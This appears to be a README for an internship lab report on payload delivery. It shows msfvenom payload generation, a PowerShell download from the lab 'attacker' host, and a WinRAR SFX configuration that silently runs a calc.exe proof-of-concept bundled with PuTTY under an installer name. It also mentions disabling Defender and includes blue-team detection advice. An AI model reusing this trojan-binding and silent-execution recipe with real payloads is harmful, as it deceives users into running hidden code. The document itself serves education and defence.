# payload-delivery-sfx-binding-lab
# Advanced Payload Delivery Mechanisms: Creation, SFX Binding, and Execution Analysis in an Isolated Lab Environment

> **Status:** Completed — Academic / Internship Practical
> **Program:** PKCERT Vulnerability Research Internship
> **Author:** Usman Ali
> **Submission Date:** 16 August 2026
> **Classification:** Confidential — For Academic Use Only

---

## ⚠️ Disclaimer

This repository documents a **controlled, academic, air-gapped laboratory exercise** conducted strictly for educational purposes under the PKCERT Vulnerability Research Internship program. All activity described here was performed:

- Inside an **isolated, host-only virtual network** with **zero internet connectivity**.
- Against **virtual machines owned and controlled by the author** — no third-party or production systems were touched.
- Using a **harmless Proof-of-Concept (PoC) payload** (`windows/exec CMD=calc.exe`) that performs a single, non-destructive action (launching the Windows Calculator) and establishes **no network connection**, reads/writes **no files**, and modifies **no system state**.
- With **explicit academic authorization** and in compliance with ethical hacking principles.

This material is shared for **educational and defensive research purposes only**. Do not use any of the techniques, tools, or configurations described in this repository against systems you do not own or do not have **explicit, written authorization** to test. Misuse may violate laws such as Pakistan's PECA 2016, the UK's Computer Misuse Act 1990, or equivalent legislation in your jurisdiction.

---

## 📑 Table of Contents

1. [Executive Summary](#-executive-summary)
2. [Key Achievements](#-key-achievements)
3. [Introduction to Payload Delivery](#-introduction-to-payload-delivery)
   - [Overview of Ethical Hacking](#overview-of-ethical-hacking)
   - [What is a Payload?](#what-is-a-payload)
   - [Trojans and Wrapper Concepts](#trojans-and-wrapper-concepts)
4. [Lab Environment & Architecture](#-lab-environment--architecture)
   - [Virtualization Platform](#virtualization-platform)
   - [Attacker Workstation — Kali Linux](#attacker-workstation--kali-linux)
   - [Target Machine — Windows 10](#target-machine--windows-10)
   - [Network Architecture & Validation](#network-architecture--validation)
   - [Air-Gapping & Isolation Proof](#air-gapping--isolation-proof)
5. [Theoretical Framework of Payload Binding](#-theoretical-framework-of-payload-binding)
   - [Self-Extracting (SFX) Archives](#self-extracting-sfx-archives)
   - [Sequential Execution Logic](#sequential-execution-logic)
   - [Portable Executable (PE) Header Analysis](#portable-executable-pe-header-analysis)
6. [Payload Generation Methodology](#-payload-generation-methodology)
   - [Metasploit Framework](#metasploit-framework)
   - [Why `windows/exec` with `calc.exe`?](#why-windowsexec-with-calcexe)
   - [msfvenom Command Breakdown](#msfvenom-command-breakdown)
7. [Secure File Transfer Mechanisms](#-secure-file-transfer-mechanisms)
8. [Endpoint Security Interaction](#-endpoint-security-interaction)
9. [Advanced Payload Binding via WinRAR SFX](#-advanced-payload-binding-via-winrar-sfx)
10. [Execution Demonstration & Final Evidence](#-execution-demonstration--final-evidence)
11. [Defensive Countermeasures — Blue Team Perspective](#-defensive-countermeasures--blue-team-perspective)
12. [Skills & Knowledge Demonstrated](#-skills--knowledge-demonstrated)
13. [Repository Structure](#-repository-structure)
14. [Tools & Technologies Used](#-tools--technologies-used)
15. [Conclusion](#-conclusion)
16. [References](#-references)
17. [License / Usage Notice](#-license--usage-notice)

---

## 📋 Executive Summary

This repository documents a structured, laboratory-based cybersecurity practical designed to demonstrate the foundational principles of **payload delivery mechanisms** within the domain of ethical hacking and penetration testing. The exercise was conducted in a **fully isolated virtual environment** to ensure zero risk to any production or external system.

The primary objective was to generate a safe Proof-of-Concept (PoC) executable configured to launch the Windows Calculator (`calc.exe`), and subsequently bind it with a **legitimate, trusted utility** (the PuTTY SSH client) using the **WinRAR Self-Extracting (SFX) archive mechanism**. The successful simultaneous execution of both applications on the Windows 10 target machine serves as definitive proof of the delivery mechanism's operation.

This practical bridges theoretical knowledge with hands-on application, covering both **offensive (Red Team)** techniques and **defensive (Blue Team)** countermeasures.

---

## ✅ Key Achievements

- [x] Successful creation of a PoC payload using the **Metasploit Framework's `msfvenom`** utility on Kali Linux.
- [x] Establishment of a **secure, air-gapped network** between the Kali Linux (attacker) and Windows 10 (target) virtual machines.
- [x] Efficient file transfer using a **Python HTTP server** and **Windows PowerShell**.
- [x] Analysis of **Windows Defender's** signature-based detection against un-obfuscated payloads.
- [x] Successful binding of the PoC payload with `PuTTY.exe` using **WinRAR SFX archive functionality**.
- [x] Final execution demonstrating the **simultaneous launch** of `calc.exe` and PuTTY on the target machine.

---

## 🎯 Introduction to Payload Delivery

### Overview of Ethical Hacking

Ethical hacking, also known as penetration testing or white-hat hacking, is the **authorized and systematic** practice of probing computer systems, networks, and applications for security vulnerabilities. Unlike malicious hacking, it is performed with explicit permission from the system owner, aiming to identify and remediate weaknesses before malicious actors can exploit them.

The ethical hacking lifecycle consists of five phases:

| Phase | Description |
|---|---|
| **Reconnaissance** | Gathering information about the target through passive or active means. |
| **Scanning & Enumeration** | Identifying open ports, running services, and potential attack vectors. |
| **Gaining Access** | Exploiting identified vulnerabilities to access the target system. |
| **Maintaining Access** | Establishing persistence to simulate advanced persistent threats (APTs). |
| **Reporting & Remediation** | Documenting findings and providing actionable remediation recommendations. |

This practical focuses primarily on the **'Gaining Access'** phase — specifically **payload delivery**, the mechanism by which an attacker transmits code to a target system for execution.

### What is a Payload?

A payload is the component of an exploit that performs the intended action upon successful delivery and execution. Payloads are broadly classified as:

- **Singles** — Self-contained payloads performing one specific action (e.g., opening a calculator). Small, no network dependency after delivery.
- **Stagers** — Lightweight payloads that establish a channel and download a larger "Stage" payload.
- **Stages** — The second-stage component delivering advanced capability (e.g., a full Meterpreter shell).

For this academic practical, a **Singles** payload — `windows/exec` targeting `calc.exe` — was selected to demonstrate the delivery mechanism without any network-based remote access or harmful operation.

### Trojans and Wrapper Concepts

A **Trojan Horse** is malicious software that disguises itself as, or hides within, a legitimate program — named after the Greek mythological tale of the Trojan War. A **wrapper** is a technique that binds a payload with a legitimate executable so that when the combined file is run, both the carrier and the hidden payload execute, often without user awareness.

Common Trojan disguise vectors include:
- Fake software installers
- Pirated/cracked software
- Legitimate utilities downloaded from unofficial sources
- Email attachments disguised as invoices, resumes, or documents

---

## 🖥 Lab Environment & Architecture

### Virtualization Platform

**VMware Workstation Pro** was used as the hypervisor for its advanced networking configuration and industry-standard use in professional penetration testing environments. It enables creation of isolated network segments (Host-Only via `VMnet1`) that prevent unintended communication with external networks.

### Attacker Workstation — Kali Linux

| Property | Value |
|---|---|
| OS | Kali Linux 2024.x (Rolling Release) |
| Hypervisor | VMware Workstation Pro |
| Network Adapter | Host-Only Adapter (VMnet1) |
| IP Address | `192.168.26.128` |
| Subnet Mask | `255.255.255.0` |
| Primary Tools | Metasploit Framework (`msfvenom`), Python 3 |

### Target Machine — Windows 10

| Property | Value |
|---|---|
| OS | Microsoft Windows 10 Pro (64-bit) |
| Hypervisor | VMware Workstation Pro |
| Network Adapter | Host-Only Adapter (VMnet1) |
| IP Address | `192.168.26.129` |
| Security Software | Windows Defender (built-in) |
| Tools Used | PowerShell, WinRAR |

### Network Architecture & Validation

Both VMs were placed on the same Host-Only network segment, allowing mutual communication while remaining **completely isolated** from the host's external network. Connectivity was validated with ICMP ping in both directions prior to any practical activity, confirming **0% packet loss**.

### Air-Gapping & Isolation Proof

A comparison of VMware adapter modes and their security implications:

| Adapter Mode | Description | Risk Level |
|---|---|---|
| **NAT** | VM shares host's internet via virtual NAT | Payloads can reach external C2 servers |
| **Bridged** | VM connects directly to host's physical NIC | Maximum attack surface — fully exposed to LAN/internet |
| **Host-Only** ✅ | VM isolated to a private virtual network only | Safe — no routing to internet or physical LAN |
| **Internal Network** | Like Host-Only, but no host communication either | Used for complete isolation |

**Isolation was verified** by attempting to ping public DNS (`8.8.8.8`) and `google.com` from both VMs — both attempts correctly failed with *"Temporary failure in name resolution"* / *"Ping request could not find host"*, confirming no routing path to the internet existed. This dual-verification approach (internal connectivity confirmed + external isolation confirmed) represents the gold standard for ethical malware research lab validation.

---

## 🔧 Theoretical Framework of Payload Binding

### Self-Extracting (SFX) Archives

A Self-Extracting (SFX) archive is a Windows Portable Executable (PE) file that automatically extracts its compressed contents without requiring archive software on the target. It consists of three components:

1. **SFX Module (stub)** — Pre-compiled extraction/decompression logic; the entry point on execution.
2. **RAR Archive Header** — Compressed metadata describing archive contents.
3. **Compressed Data Blocks** — The actual bundled files (payload + carrier application).

**Execution flow:**
1. Windows OS loader reads the PE header and executes the SFX module.
2. The SFX module reads the SFX configuration script (`Setup=`, `Silent=`).
3. Files are extracted to a temporary directory (default: `%TEMP%`).
4. `Setup=` commands execute sequentially — payload first, then the carrier application.

### Sequential Execution Logic

```
Setup=harmless_payload.exe
Setup=putty.exe
```

This ordering ensures the PoC payload executes first (silently, in the background), followed immediately by the visible carrier application (PuTTY). From the user's perspective, only PuTTY appears to launch.

### Portable Executable (PE) Header Analysis

Every Windows executable conforms to the **Portable Executable (PE) format**, derived from COFF. Key fields relevant to this practical:

| Field | Description |
|---|---|
| **MZ Header (DOS Stub)** | First bytes `0x4D5A` ("MZ") — the DOS/Windows loader entry signature. |
| **PE Signature** | Located via offset `0x3C`, points to `'PE\0\0'`. |
| **Machine Type** | `0x014C` = x86, `0x8664` = x64. The PoC payload targeted x86. |
| **Subsystem Field** | GUI (2) vs. CUI (3) — payloads are typically GUI to avoid a console window. |
| **Import Table** | A minimal table (e.g., only `kernel32.dll`) can indicate a handcrafted/shellcode-based executable — a common IOC. |

---

## 🛠 Payload Generation Methodology

### Metasploit Framework

The **Metasploit Framework (MSF)**, developed by Rapid7, is the world's most widely used open-source penetration testing framework. Key components used in this practical:

- **`msfconsole`** — Primary CLI for accessing modules, exploits, and post-exploitation tooling.
- **`msfvenom`** — Standalone tool for generating and encoding payloads (successor to `msfpayload`/`msfencode`).

### Why `windows/exec` with `calc.exe`?

The `windows/exec` payload with `CMD=calc.exe` was deliberately chosen over a more capable payload (e.g., `windows/meterpreter/reverse_tcp`) for the following reasons:

- **Safety & Ethics** — Performs exactly one harmless action; no network connection, no file I/O, no system modification.
- **Clarity of Proof** — The Calculator launching provides unambiguous, screenshot-documentable proof of execution.
- **Academic Appropriateness** — Using `calc.exe` as a code-execution demonstrator is an industry-recognized practice (e.g., in OSCP-style labs).
- **Focus on Delivery, Not Capability** — Keeps the practical centered on the *binding/delivery mechanism*, not payload capability.

### msfvenom Command Breakdown

```bash
msfvenom -p windows/exec CMD=calc.exe -f exe -o harmless_payload.exe
```

| Flag | Purpose |
|---|---|
| `-p windows/exec` | Selects the `windows/exec` single payload module. |
| `CMD=calc.exe` | Specifies the command to execute on the target (Windows Calculator). |
| `-f exe` | Output format — wraps shellcode in a standard Windows PE `.exe` template. |
| `-o harmless_payload.exe` | Output filename/path for the generated payload. |

**Result:** Payload size 193 bytes; final `.exe` size 7,168 bytes; saved as `harmless_payload.exe`.

---

## 📡 Secure File Transfer Mechanisms

Payload delivery from attacker to target is a critical phase of any penetration test. Common methods include HTTP/HTTPS, SMB, FTP/SFTP, email attachments, and physical media. This lab used an **HTTP server** for its simplicity and to demonstrate PowerShell's native download capability.

**Step 1 — Start a Python HTTP server on Kali Linux:**
```bash
cd /root/
python3 -m http.server 8000
```

**Step 2 — Retrieve the file via Windows PowerShell:**
```powershell
Invoke-WebRequest -Uri http://192.168.26.128:8000/harmless_payload.exe `
                   -OutFile C:\Users\Public\harmless_payload.exe
```

| Parameter | Purpose |
|---|---|
| `-Uri` | Source URL of the file on the attacker's HTTP server. |
| `-OutFile` | Local destination path for the downloaded file. |

---

## 🛡 Endpoint Security Interaction

### How Windows Defender Detects Threats

Windows Defender (Microsoft Defender Antivirus) employs multiple protection layers:

- **Signature-Based Detection** — Compares files against a database of known malware signatures/hashes.
- **Heuristic Analysis** — Identifies suspicious behavioral patterns even without a signature match.
- **Cloud-Delivered Protection (MAPS)** — Submits suspicious files to Microsoft's cloud analysis infrastructure.
- **Exploit Protection** — DEP, ASLR, CFG mitigations against code injection.

### Defender's Response to the PoC Payload

As expected, Windows Defender **immediately detected and quarantined** the un-obfuscated `msfvenom`-generated payload upon download, classifying it under `Trojan:Win32/Meterpreter` (or a similar `windows/exec` variant). This confirms Defender was functioning correctly and illustrates why real-world adversaries must invest significant effort in payload obfuscation and evasion.

### Lab Continuity Note

For the purposes of this **controlled academic exercise only**, Real-Time Protection was temporarily disabled to allow execution of the PoC and the subsequent SFX binding test — a standard, documented limitation when working with un-obfuscated commodity payloads in a lab setting. This also served as a **Blue Team observation**: endpoint protection that can be disabled locally without additional controls represents a security gap that Tamper Protection and centralized policy management (Intune/GPO) are designed to close.

---

## 📦 Advanced Payload Binding via WinRAR SFX

### Prerequisites

- `harmless_payload.exe` — the msfvenom-generated PoC, transferred via the Python HTTP server.
- `putty.exe` — the official, unmodified PuTTY SSH client, downloaded from the official source.

### Step-by-Step Process

1. **File Selection** — Both files selected together in Windows Explorer → right-click → *"Add to archive…"*.
2. **General Tab** — Archive named `putty_installation.exe`; format **RAR5**; compression **Best**; **"Create SFX archive"** checked.
3. **Advanced Tab → SFX Options → Setup** — Execution order configured:
   ```
   1. harmless_payload.exe   (runs first, in background)
   2. putty.exe              (runs second, visible to user)
   ```
4. **Modes Tab** — Silent Mode set to **"Hide all"** to suppress extraction dialogs.
5. **Update Tab** — Overwrite mode set to **"Overwrite all existing files"** for a seamless run.

**Output:** A single bound executable — `putty_installation.exe` — containing the SFX module, the compressed PoC payload, the compressed carrier application, and the SFX configuration script.

---

## 🎬 Execution Demonstration & Final Evidence

Upon double-clicking `putty_installation.exe`, the following occurred within milliseconds:

1. Windows shell handed execution to the embedded SFX module.
2. The SFX module extracted both files to `%TEMP%`.
3. `harmless_payload.exe` executed first, internally invoking `CreateProcess()`/`WinExec()` to launch `calc.exe`.
4. `putty.exe` executed second, displaying the PuTTY configuration dialog.
5. **Both applications appeared on screen simultaneously.**

### Validation Summary

| Stage | Outcome |
|---|---|
| Payload Generation | `msfvenom` successfully compiled shellcode into a functional PE executable. |
| File Transfer | HTTP server + PowerShell successfully transferred the file without corruption. |
| SFX Binding | WinRAR correctly bound both executables with the configured execution order. |
| Sequential Execution | Both files extracted and executed in the correct order. |
| End-to-End Proof | The full delivery chain — generation → transfer → binding → execution — was demonstrated successfully. |

---

## 🛡 Defensive Countermeasures — Blue Team Perspective

While this practical primarily explored the **Red Team (offensive)** side, a complete analysis requires equal attention to detection and prevention.

### Detecting SFX-Bound Payloads

| Control | How It Helps |
|---|---|
| **EDR (Falcon, Defender for Endpoint, SentinelOne)** | Monitors process creation from `%TEMP%` — a strong IOC for SFX-spawned children. |
| **YARA Rules** | Detects known SFX module signatures prepended to archive/executable content. |
| **File Hash Allowlisting** | Flags any executable whose hash doesn't match an approved application baseline. |
| **Sysmon Monitoring** | Logs file creation in `%TEMP%`/`%APPDATA%` followed by execution — high-confidence IOC. |
| **Network Traffic Analysis (NGFW/NDR)** | Detects anomalous outbound connections from network-capable payload variants. |

### User Awareness & Prevention

- Download software **only from official vendor sources**.
- **Verify SHA-256 hashes** of downloaded executables against vendor-published checksums.
- Apply the **Principle of Least Privilege** — standard users should not run with admin rights.
- Deploy **email security gateways** that sandbox and analyze attachments.
- Enforce **application allowlisting** (Windows AppLocker / WDAC) to block unauthorized or unsigned executables.

---

## 🎓 Skills & Knowledge Demonstrated

- Ethical hacking methodology — a structured, phase-based penetration testing approach.
- Virtual lab design — building isolated, air-gapped environments in VMware Workstation Pro.
- Metasploit Framework proficiency — `msfvenom` payload generation and format options.
- Network file transfer techniques — HTTP server delivery + PowerShell retrieval.
- Antivirus/EDR interaction analysis — signature-based detection behavior.
- SFX archive engineering — custom execution order and stealth configuration in WinRAR.
- Defensive security awareness — Blue Team detection and prevention strategy for the very techniques demonstrated.

---

## 📁 Repository Structure

```
.
├── README.md                          # This file
├── docs/
│   └── Project_5_Payload_execution_and_binding.pdf   # Full practical report
├── screenshots/                       # Evidence figures referenced in the report (Fig. 3.1–9.2)
└── LICENSE                            # Usage terms (see below)
```

> **Note:** This repository is documentation of a completed lab exercise. No live payload binaries, msfvenom-generated executables, or SFX-bound artifacts are distributed in this repository, in line with responsible disclosure practices.

---

## 🧰 Tools & Technologies Used

| Category | Tool |
|---|---|
| Hypervisor | VMware Workstation Pro |
| Attacker OS | Kali Linux 2024.x |
| Target OS | Windows 10 Pro (64-bit) |
| Payload Generation | Metasploit Framework (`msfvenom`) |
| File Transfer | Python 3 `http.server`, Windows PowerShell (`Invoke-WebRequest`) |
| Endpoint Security | Windows Defender Antivirus |
| Archive/Binding | WinRAR SFX |
| Carrier Application | PuTTY (official release) |

---

## 📝 Conclusion

This practical successfully demonstrated the end-to-end lifecycle of a safe, laboratory-controlled payload delivery mechanism — from payload generation on a Kali Linux attack workstation, through binding with a legitimate application, to final execution on a Windows 10 target machine. The simultaneous launch of Windows Calculator and PuTTY on the target machine provided definitive, documentable proof of the delivery and binding concept.

This foundation supports further study into advanced topics such as payload obfuscation, evasion techniques, post-exploitation, and incident response — all firmly within an authorized, ethical, and academic context.

---

## 📚 References

- Offensive Security. (2024). *Metasploit Unleashed — Free Ethical Hacking Course*. https://www.offsec.com/metasploit-unleashed/
- Rapid7. (2024). *Metasploit Framework Documentation — msfvenom*. https://docs.rapid7.com/metasploit/
- Microsoft Corporation. (2024). *Microsoft Defender Antivirus Documentation*. https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-antivirus-windows
- RARLAB. (2024). *WinRAR Self-Extracting Archive Documentation*. https://www.win-rar.com/selfextract.html
- NIST. (2024). *NIST Cybersecurity Framework 2.0*. https://www.nist.gov/cyberframework
- MITRE ATT&CK. (2024). *T1566 — Phishing* and *T1027 — Obfuscated Files or Information*. https://attack.mitre.org/
- Microsoft Sysinternals. (2024). *Sysmon — System Monitor*. https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon
- The PuTTY Team. (2024). *PuTTY Download Page*. https://www.chiark.greenend.org.uk/~sgtatham/putty/

---

## ⚖️ License / Usage Notice

This repository is published for **educational and portfolio purposes** as part of an academic internship program (PKCERT Vulnerability Research Internship). It documents work performed exclusively within a controlled, isolated, non-production lab.

- ❌ Do not use any technique described here against systems you do not own or lack explicit written authorization to test.
- ❌ No live/functional payload binaries are included in this repository.
- ✅ Feel free to reference the methodology, network isolation approach, and Blue Team countermeasures for educational study.

---

*Advanced Payload Delivery Mechanisms — Academic Practical Report | Usman Ali | 16 August 2026*
